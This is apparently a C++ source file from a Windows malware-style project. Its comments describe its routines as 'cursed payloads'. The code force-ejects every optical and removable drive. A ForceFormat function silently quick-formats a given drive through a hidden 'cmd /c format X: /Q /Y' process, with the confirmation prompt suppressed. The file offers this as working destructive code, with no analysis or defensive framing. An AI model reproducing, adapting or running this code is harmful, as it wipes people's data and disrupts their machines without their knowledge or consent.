#define WIN32_LEAN_AND_MEAN
#define NOMINMAX

#include <windows.h>
#include <winioctl.h>

#include "dates.h"
#include "hw.h"

#include "../utils/unicurse.h" // needed for cursed payloads

// Real mass eject / format — no MessageBoxes.
// Parameters are drive letters (L'C', L'D', ...) rather than raw ints.

namespace MassEject
{

static int EnumDisks(wchar_t roots[][4], int maxDrives)
{
	// Fills up to `maxDrives` entries with drive-root strings
	// ("C:\", "D:\", ...). Returns how many were filled.
	DWORD mask = GetLogicalDrives();
	int n = 0;

	for (int i = 0; i < 26 && n < maxDrives; ++i)
	{
		if (mask & (1u << i))
		{
			wsprintfW(roots[n], L"%c:\\", L'A' + i);
			++n;
		}
	}

	return n;
}

static void ForceEject(wchar_t driveLetter)
{
	wchar_t devicePath[] = {
		L'\\', L'\\', L'.', L'\\',
		driveLetter,
		L':', 0
	};

	HANDLE h = CreateFileW(
		devicePath,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		nullptr,
		OPEN_EXISTING,
		0,
		nullptr
	);

	if (h == INVALID_HANDLE_VALUE)
		return;

	DWORD bytes = 0;

	DeviceIoControl(
		h, FSCTL_LOCK_VOLUME,
		nullptr, 0, nullptr, 0, &bytes, nullptr);

	DeviceIoControl(
		h, FSCTL_DISMOUNT_VOLUME,
		nullptr, 0, nullptr, 0, &bytes, nullptr);

	DeviceIoControl(
		h, IOCTL_STORAGE_EJECT_MEDIA,
		nullptr, 0, nullptr, 0, &bytes, nullptr);

	CloseHandle(h);
}

// Eject every optical / removable drive on the box.
void EjectAllOptical()
{
	DWORD mask = GetLogicalDrives();

	for (int i = 0; i < 26; ++i)
	{
		if (!(mask & (1u << i)))
			continue;

		wchar_t root[4] = {
			static_cast<wchar_t>(L'A' + i),
			L':',
			0,
			0
		};

		const UINT type = GetDriveTypeW(root);

		if (type == DRIVE_CDROM || type == DRIVE_REMOVABLE)
			ForceEject(static_cast<wchar_t>(L'A' + i));
	}
}

static void ForceFormat(wchar_t driveLetter)
{
	// System format.com, run silently via cmd /c with a no-window
	// flag. /Q = quick, /Y = suppress confirmation prompts.
	wchar_t cmdLine[64];
	wsprintfW(
		cmdLine,
		L"cmd /c format %c: /Q /Y",
		driveLetter
	);

	STARTUPINFOW si{};
	si.cb = sizeof(si);

	PROCESS_INFORMATION pi{};

	if (CreateProcessW(
			nullptr,
			cmdLine,
			nullptr,
			nullptr,
			FALSE,
			CREATE_NO_WINDOW,
			nullptr,
			nullptr,
			&si,
			&pi))
	{
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
}

} // namespace MassEject